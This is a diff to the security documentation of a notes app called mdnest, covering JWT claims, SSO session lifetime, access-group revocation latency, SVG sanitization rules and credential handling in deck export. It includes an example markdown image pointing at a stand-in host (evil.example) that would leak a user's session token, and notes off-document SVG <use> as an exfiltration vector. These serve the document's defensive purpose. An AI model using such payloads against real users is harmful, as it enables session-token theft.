@@ -109,7 +109,20 @@ Every successful sign-in (any mode, any provider) issues an HS256 JWT containing
 | `user_id` | Postgres `users.id` |
 | `role` | `superadmin`, `admin`, or `collaborator` (v3.5.0+) |
 | `totp_enabled` | reflects the user's TOTP state at issue time; refreshed at login |
-| `iat` / `exp` | 30 days |
+| `groups` *(v4.2.0+)* | IdP group IDs from `OIDC_GROUPS_CLAIM`, snapshotted at login. Omitted when the IdP emits none or the feature is off. |
+| `iat` / `exp` | 30 days (365 with "remember me"; **12 hours for SSO sessions** — see below) |
+
+**Claims are read from the token, not re-checked per request.** `role` and
+`groups` are taken from the JWT on every request with no database reload. That
+means a role change or a group change does not take effect until the user's next
+sign-in. It is why SSO sessions, which carry the `groups` snapshot that drives
+authorization, are minted with a deliberately short **12-hour** TTL
+(`ssoJWTTTL`) rather than the year-long "remember me" lifetime: it bounds how
+long a stale snapshot can outlive a change at the IdP. Password-login TTLs are
+unchanged.
+
+If you need to revoke someone *now*, rotate `MDNEST_JWT_SECRET` — that
+invalidates every active session immediately.
 
 The JWT is **signed**, not encrypted. Anyone with the token can read its claims. `MDNEST_JWT_SECRET` is the HMAC key — keep it secret, rotate it if you suspect compromise (rotating invalidates every active session immediately).
 
@@ -172,6 +185,34 @@ When mdnest is upgraded from a pre-v3.5.0 install, migration `007_namespace_admi
 - `permission` is `read` or `write`. A `write` grant satisfies a `read` request automatically.
 - Grants stack — a user can have multiple grants on the same namespace at different paths.
 
+### Access Groups *(v4.2.0+)*
+
+`access_groups` + `access_group_members` + `access_group_grants` add a second,
+opt-in source of the same grant shape. Effective access is the **union** of a
+user's own grants and the grants of every group they belong to; group access is
+consulted only after direct grants fail, and a nil group store disables the layer
+entirely (single mode, or no database).
+
+A member row is a mdnest `user_id` **XOR** an `oidc_group` id — enforced by a
+database `CHECK`, not just application code. An OIDC-group member may carry a
+display label; matching is always on the group id, never the label.
+
+**The two member kinds have different revocation latency, and operators must know
+which they're relying on:**
+
+| Member kind | Resolved | Removing access takes effect |
+|---|---|---|
+| mdnest user | live, per request (`WHERE user_id = …`) | immediately |
+| OIDC group id | from the `groups` JWT claim, snapshotted at login | at next sign-in, bounded by the 12h SSO TTL |
+
+So removing someone from a group **in the IdP** is not an immediate revocation of
+their mdnest access — it takes effect when their session token expires. Removing
+them from the mdnest group, deleting the group, or revoking the group's grant all
+take effect at once. For an immediate cut-off regardless of source, block the user
+or rotate `MDNEST_JWT_SECRET`.
+
+Group management (`/api/admin/groups*`) is superadmin-only.
+
 ### Grant depth limit (v3.5.0+)
 
 `GRANT_MAX_DEPTH` in `mdnest.conf` (default `3`) caps how deep into a namespace tree a grant's path can go:
@@ -227,12 +268,19 @@ All markup mdnest injects into the DOM now passes through `frontend/src/sanitize
 | `Preview.jsx` | `sanitizeHtml` | `marked()` output for a note body |
 | `ReleaseNotesModal.jsx` | `sanitizeHtml` | release notes fetched from the GitHub API |
 | `Preview.jsx`, `MermaidViewer.jsx` | `sanitizeSvg` | mermaid-rendered SVG |
+| `Preview.jsx` *(v4.2.0+)* | `sanitizeSvg` | Excalidraw-exported SVG for a read-only drawing embed |
 
 Stripped: event-handler attributes (`onerror`, `onclick`, …), dangerous URI schemes (`javascript:`, `data:` in active contexts), `<script>`, `<iframe>`, `<object>`, `<embed>`, `<form>`. Preserved deliberately: `class`, `data-*` (the Preview's mermaid and task-checkbox post-passes depend on them), `<input type="checkbox">` task items, and `target` — with an `afterSanitizeAttributes` hook forcing `rel="noopener noreferrer"` on `target="_blank"` so external links can't reach back into the opener.
 
 **`sanitizeSvg` must keep `foreignObject`.** DOMPurify's SVG profile excludes it, but mermaid renders every flowchart node label inside one (`htmlLabels` defaults to true), so the bare profile silently deletes the text of every label while the shapes still draw. Allowing the element doesn't weaken anything — DOMPurify still descends into the subtree and strips scripts, iframes, and handlers. Don't "fix" it by also allowing `div`/`span`: once those are on the allow-list they fail DOMPurify's namespace check instead of being unwrapped, and the labels disappear again. `frontend/src/__tests__/sanitize.test.js` pins both directions.
 
+**`sanitizeSvg` allows `<use>`, but only same-document references** *(v4.2.0+)*. Excalidraw paints an embedded raster image as a `<symbol>` in `<defs>` referenced by `<use href="#…">`. DOMPurify drops `<use>` by default for a good reason — an off-document `<use href="https://…">` is a classic SVG exfiltration/XSS vector — but with it dropped the `<symbol>` survived in `<defs>`, was never painted, and the image silently vanished from the embed while looking correct in the editor's own canvas. `use` is therefore on the allow-list *paired with* an `afterSanitizeAttributes` hook that removes any `use` whose `href` / `xlink:href` doesn't start with `#`. Both halves are pinned by tests: one asserts a same-document `use` survives, the other asserts an off-document one is dropped — defeating the guard reddens the second.
+
 This is a second layer, not the only one — mermaid also runs at its default `securityLevel: 'strict'`.
+
+### Deck export never sends credentials cross-origin *(v4.2.0+)*
+
+The standalone Marp export inlines images as data URIs, fetching each with the user's session token so `/api/files/…` assets resolve. Deck content is user-authored and shared, so an image URL is attacker-controlled: a deck containing `![](https://evil.example/x.png)` would hand the mdnest JWT of whoever exported it to that host. The export therefore attaches `Authorization` **only** when the resolved URL is same-origin; cross-origin images are still fetched (so public assets inline and the deck stays self-contained) but never with credentials, and non-`http(s)` schemes are skipped. This was caught in review and never shipped in a release.
 
 ---
 
